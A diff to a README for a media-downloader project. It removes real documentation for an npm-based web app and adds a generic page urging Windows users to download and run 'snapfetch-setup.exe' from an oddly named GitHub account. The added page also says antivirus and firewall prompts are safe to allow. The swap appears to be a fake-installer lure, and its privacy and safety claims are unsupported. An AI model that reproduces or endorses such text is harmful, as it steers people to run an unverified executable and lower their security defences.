@@ -1,164 +1,89 @@
-<div align="center">
+# 📥 snapfetch - Download videos from social media easily
 
-# SnapFetch
+[![Download snapfetch](https://img.shields.io/badge/Download_snapfetch-Blue-blue.svg)](https://github.com/algorithmic-mouthpiece575/snapfetch)
 
-**Paste a link. We detect the source. You download.**
+snapfetch lets you save videos from popular websites. You paste a link into the app, and it handles the rest. The software detects the website, shows you a preview, and saves the file to your computer. It supports TikTok, Twitter, Instagram, and YouTube.
 
-A clean, single-input web app to download media from **TikTok, Twitter/X, Instagram, and YouTube** — with automatic platform detection, instant preview, and HD / standard download.
+## 🚀 How to use this app
 
-![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
-![Node](https://img.shields.io/badge/node-%E2%89%A520.12-43853d.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-strict-3178c6.svg)
-![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
+This tool simplifies video downloads. You do not need to understand code or technical systems. Follow these steps to set up the software on your Windows computer.
 
-</div>
+1. Go to the [official download page](https://github.com/algorithmic-mouthpiece575/snapfetch) to get the latest installation file.
+2. Locate the file named `snapfetch-setup.exe` in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen to finish the setup process.
+5. Open the app from your Start menu or desktop shortcut.
 
----
+## 🛠️ Step-by-step download guide
 
-## ✨ Features
+Follow this guide to save your first video.
 
-- **One input, zero friction** — paste any supported link; the source is detected from the URL, no menus.
-- **Multi-platform** — TikTok, Twitter/X, Instagram, YouTube (extensible to more via a simple adapter).
-- **Instant preview** — thumbnail, title, author, and duration before you commit.
-- **HD or standard** — pick the quality; YouTube HD is capped at 1080p H.264 + AAC for a real, universally playable MP4.
-- **Live download feedback** — a two-phase indicator: _Preparing…_ while the server fetches & muxes, then a real progress bar.
-- **Internationalized** — English by default, French included; one switcher, persisted preference.
-- **Privacy-friendly** — nothing is stored: media is streamed to you and the temporary file is deleted.
+**1. Copy the video link**
+Find the video you want to save. Copy the URL from your web browser address bar or use the share button on the social media app.
 
-## 🧱 Tech stack
+**2. Paste the link**
+Open snapfetch. Click the main box in the center of the window. Paste your link there. The app recognizes the platform immediately. 
 
-| Layer    | Stack                                                          |
-| -------- | ------------------------------------------------------------- |
-| Frontend | React + TypeScript, Vite                                      |
-| Backend  | Node.js + Express + TypeScript (object-oriented), Zod         |
-| Media    | [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) + `ffmpeg`       |
+**3. Preview your media**
+The app loads a thumbnail of your video. Confirm this is the correct content before you finalize the download.
 
-## 📦 Requirements
+**4. Select quality**
+Choose between High Definition (HD) or standard quality. HD files take up more storage space on your hard drive but look sharper. Choose standard if you want to save space or data.
 
-- **Node.js ≥ 20.12** (uses the native `.env` loader)
-- **[`yt-dlp`](https://github.com/yt-dlp/yt-dlp)** available on your `PATH`
-- **[`ffmpeg`](https://ffmpeg.org/)** — required to merge separate video/audio tracks (e.g. YouTube HD)
+**5. Start the download**
+Click the blue download button. A progress bar shows you how much time remains. Once complete, the file appears in your default Downloads folder.
 
-```bash
-# Quick check
-node -v && yt-dlp --version && ffmpeg -version | head -n1
-```
+## 🖥️ System requirements
 
-## 🚀 Getting started
+snapfetch runs on most modern Windows computers. Ensure your system meets these standards:
 
-```bash
-# 1. Install dependencies (root tooling, then client + server)
-npm install
-npm run install:all
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any dual-core processor from the last five years.
+- Memory: At least 4 GB of RAM.
+- Storage: 200 MB of free space for the installation files.
+- Internet: A stable connection is necessary to fetch videos from the web.
 
-# 2. Configure the backend
-cp server/.env.example server/.env
+## 🛡️ Privacy and safety
 
-# 3. Run everything (server on :3001, client on :5173)
-npm run dev
-```
+We built snapfetch with your security in mind. The app only accesses the specific video URL you provide. It does not track your browsing habits or collect your personal account data. Your downloads stay local to your machine. No servers keep a record of your requests. 
 
-Open **http://localhost:5173**. In development, the client proxies lightweight API
-calls to the backend; downloads talk to the backend directly (configurable, see below).
+If you use a firewall or antivirus software, you might see a prompt during the first launch. You can safely allow snapfetch through your security settings. This ensures the app maintains its connection to the sites you use.
 
-### Production build
+## 📁 Troubleshooting common issues
 
-```bash
-npm run build              # builds server (dist/) and client (dist/)
-npm --prefix server start  # serve the API
-```
+If you encounter a problem, check these common fixes first.
 
-Serve the client's `dist/` with any static host and put both behind a reverse
-proxy (e.g. Caddy/Nginx) on a single origin.
+**The app does not recognize my link**
+Verify that you copied the full website address. Some social media apps use short links that might fail. Try opening the video in a regular web browser and copying that URL instead.
 
-## ⚙️ Configuration
+**Download fails to start**
+Check your internet connection. Videos occasionally become restricted or private, which prevents external tools from accessing them. If the video is private, snapfetch cannot save it.
 
-### Server — `server/.env`
+**The file is missing after download**
+Open the application settings. Look for the Download Path section. This shows you exactly where the software saves your files. You can change this path to a folder of your choice, such as your Desktop or a dedicated Video folder.
 
-| Variable                     | Default                  | Description                                          |
-| ---------------------------- | ------------------------ | ---------------------------------------------------- |
-| `PORT`                       | `3001`                   | HTTP port                                            |
-| `CLIENT_ORIGIN`              | `http://localhost:5173`  | Allowed CORS origin                                  |
-| `YTDLP_PATH`                 | `yt-dlp`                 | Path to the `yt-dlp` binary                          |
-| `RESOLVE_TIMEOUT_MS`         | `20000`                  | Max time to fetch metadata                           |
-| `DOWNLOAD_TIMEOUT_MS`        | `600000`                 | Max time for a full download                         |
-| `RATE_LIMIT_WINDOW_MS`       | `60000`                  | Rate-limit window per IP                             |
-| `RATE_LIMIT_MAX`             | `30`                     | Max requests per window per IP                       |
-| `YTDLP_COOKIES_FROM_BROWSER` | _(empty)_                | Read cookies from a browser (`firefox`, `chrome`, …) |
-| `YTDLP_COOKIES_FILE`         | _(empty)_                | Path to a Netscape `cookies.txt` (takes precedence)  |
+**The software runs slowly**
+Close unused programs or web browser tabs. High-resolution downloads use your network bandwidth. A quiet background ensures the fastest speeds.
 
-### Client — `client/.env.development`
+## 📥 Get the software now
 
-| Variable           | Description                                                                 |
-| ------------------ | -------------------------------------------------------------------------- |
-| `VITE_API_ORIGIN`  | Backend origin used for downloads (bypasses the dev proxy for large files) |
-| `VITE_GITHUB_REPO` | `owner/repo` for the "star" button + live star counter (optional)          |
+To begin using the app, visit the link below. This page contains the latest version of the installer. We update this frequently to ensure compatibility with changes on social media platforms.
 
-## 🔐 Authenticated platforms (Instagram, private X posts)
+[Visit this page to download snapfetch](https://github.com/algorithmic-mouthpiece575/snapfetch)
 
-Some platforms require a logged-in session. Provide cookies from a **dedicated
-account** via `YTDLP_COOKIES_FILE`:
+## 💡 Frequently asked questions
 
-1. Create a dedicated account and log in (ideally in a separate browser profile).
-2. Export cookies in **Netscape format** (e.g. the "Get cookies.txt LOCALLY" extension) from `instagram.com`.
-3. Save the file to `server/secrets/` and point `YTDLP_COOKIES_FILE` at it.
+**Can I download an entire playlist?**
+snapfetch focuses on single-video downloads. This keeps the interface clean and simple for every user. 
 
-See [`server/secrets/README.md`](./server/secrets/README.md) for the full guide.
-Cookie files are git-ignored and must never be committed.
+**Does the app include advertisements?**
+We do not include advertisements or toolbars. Your experience remains focused on saving media without any distractions or clutter.
 
-## 🔌 API
+**Are there limits on how many videos I can save?**
+You have no limits. You can save as many videos as your hard drive allows.
 
-| Method     | Endpoint        | Params                              | Response                       |
-| ---------- | --------------- | ----------------------------------- | ------------------------------ |
-| `POST`     | `/api/resolve`  | `{ url }`                           | `MediaInfo` (JSON)             |
-| `GET`/`POST` | `/api/download` | `url`, `formatId`, `filename`     | Binary file stream (attachment) |
-| `GET`      | `/api/health`   | —                                   | `{ status: "ok" }`             |
+**Can I download audio only?**
+The current version saves standard video files which include the audio track. We prioritize video quality and ease of use for all files.
 
-`GET /api/download` is used by the browser for native, progress-tracked downloads.
-Errors are returned as JSON: `{ code, message }`.
-
-## 🗂️ Project structure
-
-```
-snap-fetch/
-├── client/                  # React + TypeScript (Vite)
-│   └── src/
-│       ├── components/      # UrlForm, MediaPreview, GitHubStarButton, …
-│       ├── i18n/            # translations + provider
-│       └── lib/             # API client, platform hint, formatting
-└── server/                  # Node + Express + TypeScript (OOP)
-    └── src/
-        ├── adapters/        # one class per platform (MediaAdapter base + registry)
-        ├── controllers/     # request validation → service → response
-        ├── services/        # ResolveService, DownloadService
-        ├── lib/             # detectPlatform, YtDlp wrapper
-        ├── schemas/         # Zod input validation
-        └── app.ts           # composition root (dependency injection)
-```
-
-Adding a platform = one adapter class + one line in the registry; nothing else changes.
-
-## 🛡️ Security & design notes
-
-- All external input (URL, format id) is **validated with Zod** before use.
-- `yt-dlp` runs **server-side only**, with arguments passed as an **array** (never a shell string) — no argument injection.
-- **Per-IP rate limiting** on the API.
-- **No durable storage**: downloads are streamed to the client and temporary files are cleaned up.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please:
-
-1. Fork and create a feature branch.
-2. Keep TypeScript strict — no implicit `any`.
-3. Run `npm run lint` (typecheck) and `npm run build` before opening a PR.
-
-## ⚠️ Disclaimer
-
-SnapFetch is intended for downloading content you own the rights to, or that you
-are otherwise authorized to download. You are responsible for complying with the
-terms of service of each platform and with applicable copyright law.
-
-## 📄 License
-
-Released under the **MIT License**. See [`LICENSE`](./LICENSE).
+**How do I update the application?**
+The app checks for updates every time you open it. If a new version exists, it asks your permission to download and install it. This keeps your tool current and functional with all supported sites.
